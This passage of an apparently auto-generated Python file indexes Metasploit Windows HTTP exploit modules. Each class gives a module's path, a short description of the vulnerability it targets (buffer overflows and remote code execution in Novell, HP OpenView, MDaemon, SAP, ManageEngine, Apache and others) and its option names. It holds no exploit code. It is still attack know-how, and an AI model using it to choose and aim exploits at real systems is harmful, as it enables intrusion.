			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_novell_messenger_acceptlang(object):
		"""
		
          This module exploits a stack buffer overflow in Novell GroupWise
        Messenger Server v2.0. This flaw is triggered by any HTTP
        request with an Accept-Language header greater than 16 bytes.
        To overwrite the return address on the stack, we must first
        pass a memcpy() operation that uses pointers we supply. Due to the
        large list of restricted characters and the limitations of the current
        encoder modules, very few payloads are usable.
      
		"""

		path = 'windows/http/novell_messenger_acceptlang'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_osb_uname_jlist(object):
		"""
		
          This module exploits an authentication bypass vulnerability
        in login.php. In conjuction with the authentication bypass issue,
        the 'jlist' parameter in property_box.php can be used to execute
        arbitrary system commands.
        This module was tested against Oracle Secure Backup version 10.3.0.1.0
      
		"""

		path = 'windows/http/osb_uname_jlist'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			CMD = 'CMD'

	class windows_http_manageengine_connectionid_write(object):
		"""
		
        This module exploits a vulnerability found in ManageEngine Desktop Central 9. When
        uploading a 7z file, the FileUploadServlet class does not check the user-controlled
        ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to
        inject a null bye at the end of the value to create a malicious file with an arbitrary
        file type, and then place it under a directory that allows server-side scripts to run,
        which results in remote code execution under the context of SYSTEM.

        Please note that by default, some ManageEngine Desktop Central versions run on port 8020,
        but older ones run on port 8040. Also, using this exploit will leave debugging information
        produced by FileUploadServlet in file rdslog0.txt.

        This exploit was successfully tested on version 9, build 90109 and build 91084.
      
		"""

		path = 'windows/http/manageengine_connectionid_write'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_TARGETURI = 'TARGETURI'

	class windows_http_mdaemon_worldclient_form2raw(object):
		"""
		
      This module exploits a stack buffer overflow in Alt-N MDaemon SMTP server for
      versions 6.8.5 and earlier. When WorldClient HTTP server is installed (default),
      a CGI script is provided to accept html FORM based emails and deliver via MDaemon.exe,
      by writing the CGI output to the Raw Queue. When X-FromCheck is enabled (also default),
      the temporary form2raw.cgi data is copied by MDaemon.exe and a stack based
      overflow occurs when an excessively long From field is specified.
      The RawQueue is processed every 1 minute by default, to a maximum of 60 minutes.
      Keep this in mind when choosing payloads or setting WfsDelay... You'll need to wait.

      Furthermore, this exploit uses a direct memory jump into a nopsled (which isn't very
      reliable). Once the payload is written into the Raw Queue by Form2Raw, MDaemon will
      continue to crash/execute the payload until the CGI output is manually deleted
      from the queue in C:/MDaemon/RawFiles/*.raw.
      
		"""

		path = 'windows/http/mdaemon_worldclient_form2raw'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_maxdb_webdbm_get_overflow(object):
		"""
		
          This module exploits a stack buffer overflow in the MaxDB WebDBM
        service. This service is included with many recent versions
        of the MaxDB and SAPDB products. This particular module is
        capable of exploiting Windows systems through the use of an
        SEH frame overwrite. The offset to the SEH frame may change
        depending on where MaxDB has been installed, this module
        assumes a web root path with the same length as:

        C:/Program Files/sdb/programs/web/Documents
      
		"""

		path = 'windows/http/maxdb_webdbm_get_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_hp_nnm_ovwebhelp(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.50.
        By sending a specially crafted CGI request to OvWebHelp.exe, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/http/hp_nnm_ovwebhelp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_altn_securitygateway(object):
		"""
		
          Alt-N SecurityGateway is prone to a buffer overflow condition. This
        is due to insufficient bounds checking on the "username"
        parameter. Successful exploitation could result in code
        execution with SYSTEM level privileges.

        NOTE: This service doesn't restart, you'll only get one shot. However,
        it often survives a successful exploitation attempt.
      
		"""

		path = 'windows/http/altn_securitygateway'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_hp_nnm_openview5(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.50.
        By sending a specially crafted CGI request, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/http/hp_nnm_openview5'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_ibm_tpmfosd_overflow(object):
		"""
		
          This is a stack buffer overflow exploit for IBM Tivoli Provisioning Manager
        for OS Deployment version 5.1.0.X.
      
		"""

		path = 'windows/http/ibm_tpmfosd_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			required_SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_apache_chunked(object):
		"""
		
          This module exploits the chunked transfer integer wrap
        vulnerability in Apache version 1.2.x to 1.3.24. This
        particular module has been tested with all versions of the
        official Win32 build between 1.3.9 and 1.3.24. Additionally,
        it should work against most co-branded and bundled versions
        of Apache (Oracle 8i, 9i, IBM HTTPD, etc).

        You will need to use the Check() functionality to determine
        the exact target version prior to launching the exploit. The
        version of Apache bundled with Oracle 8.1.7 will not
        automatically restart, so if you use the wrong target value,
        the server will crash.
      
		"""

		path = 'windows/http/apache_chunked'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_sap_configservlet_exec_noauth(object):
		"""
		
        This module allows remote code execution via operating system commands through the
        SAP ConfigServlet without any authentication. This module has been tested successfully
        with SAP NetWeaver 7.00 and 7.01 on Windows Server 2008 R2.
      
		"""

		path = 'windows/http/sap_configservlet_exec_noauth'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			FileDropperDelay = 'FileDropperDelay'
			required_TARGETURI = 'TARGETURI'
			required_DELETE_FILES = 'DELETE_FILES'

	class windows_http_cogent_datahub_request_headers_bof(object):
		"""
		
        This module exploits a stack based buffer overflow on Cogent DataHub 7.3.0. The
        vulnerability exists in the HTTP server. While handling HTTP headers, a
        strncpy() function is used in a dangerous way. This module has been tested
        successfully on Cogent DataHub 7.3.0 (Demo) on Windows XP SP3.
      
		"""

		path = 'windows/http/cogent_datahub_request_headers_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
